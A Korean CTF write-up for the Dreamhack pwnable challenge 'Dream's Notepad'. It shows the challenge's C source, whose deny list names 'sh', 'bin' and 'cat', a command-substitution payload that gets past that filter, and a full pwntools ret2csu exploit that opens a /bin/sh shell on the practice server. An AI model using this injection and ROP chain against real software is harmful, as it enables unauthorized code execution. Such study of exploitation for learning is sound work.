---
title: "Dream's Notepad 라이트업"
date: 2025-05-06 00:00:00 +0900
categories: [CTF]
tags: [pwnable, writeup]
permalink: /posts/pwn-Dreams-Notepad/
---

바이너리의 소스 코드가 주어집니다.

```c
void main()
{
    Initalize();

    puts("Welcome to Dream's Notepad!\n");

    char title[10] = {0,};
    char content[64] = {0,};

    puts("-----Enter the content-----");
    read(0, content, sizeof(content) - 1);

    for (int i = 0; content[i] != 0; i++)
    {
        if (content[i] == '\n')
        {
            content[i] = 0;
            break;
        }
    }

    if(strstr(content, ".") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "/") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, ";") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "*") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "cat") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "echo") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "flag") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "sh") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "bin") != NULL) {
        puts("It can't be..");
        return;
    }

    char tmp[128] = {0,};

    sprintf(tmp, "echo %s > /home/Dnote/note", content);
    system(tmp);

    FILE* p = fopen("/home/Dnote/note", "r");
    unsigned int size = 0;
    if (p > 0)
    {
        fseek(p, 0, SEEK_END);
        size = ftell(p) + 1;
        fclose(p);
        remove("/home/Dnote/note");
    }

    char message[256];

    puts("\n-----Leave a message-----");
    read(0, message, size - 1);

    puts("\nBye Bye!!:-)");
}
```

# 공격 기법

이 바이너리에는 카나리가 없습니다. <br>

그리고 다음을 전송하면
```c
p.send(b"$(printf '%01000d' 0)")
```

**size** 변수를 조작할 수 있습니다 => Bof + ret 덮어쓰기 <br>

이 바이너리에는 두 가지 유용한 가젯이 있습니다: csu_init, csu_call <br>

![csuinit](/assets/img/posts/CTF/dreamhack/pwnable/DreamNotepad_csuinit.png) <br>

![csucall](/assets/img/posts/CTF/dreamhack/pwnable/DreamNotepad_csucall.png) <br>

이 두 가젯을 사용하면 원하는 함수를 호출할 수 있습니다!! <br>

# 익스플로잇

1. **read(0,bss,8)** 호출 => /bin/sh 문자열 만들기
2. system(/bin/sh) 호출

익스플로잇 코드는 다음과 같습니다.

```python
from pwn import *
context.log_level = 'debug'
p = remote('host8.dreamhack.games', 14070)
e = ELF('./Notepad')
libc = e.libc
bss = p64(e.bss())

csu_init = p64(0x400c6a)
csu_call = p64(0x400c50)
ret = p64(0x400c8c)

p.recvuntil("----\n")
p.send(b"$(printf '%01000d' 0)")

p.recvuntil("----\n")

payload = b'A' * 488
payload += csu_init
payload += p64(0)
payload += p64(1)
payload += p64(e.got['read'])
payload += p64(8)
payload += bss
payload += p64(0)
payload += csu_call

payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(e.got['system'])
payload += p64(0)
payload += p64(0)
payload += bss
payload += ret
payload += csu_call

p.sendline(payload)

time.sleep(1)

p.send('/bin/sh\x00')

p.interactive()

```

배운 점: ropr를 믿지 마세요 <br>

![ropr](/assets/img/posts/CTF/dreamhack/pwnable/DreamNotepad_ropr.png) <br>

ropr의 결과만으로는 **pop rbx**만 찾을 수 없었습니다....
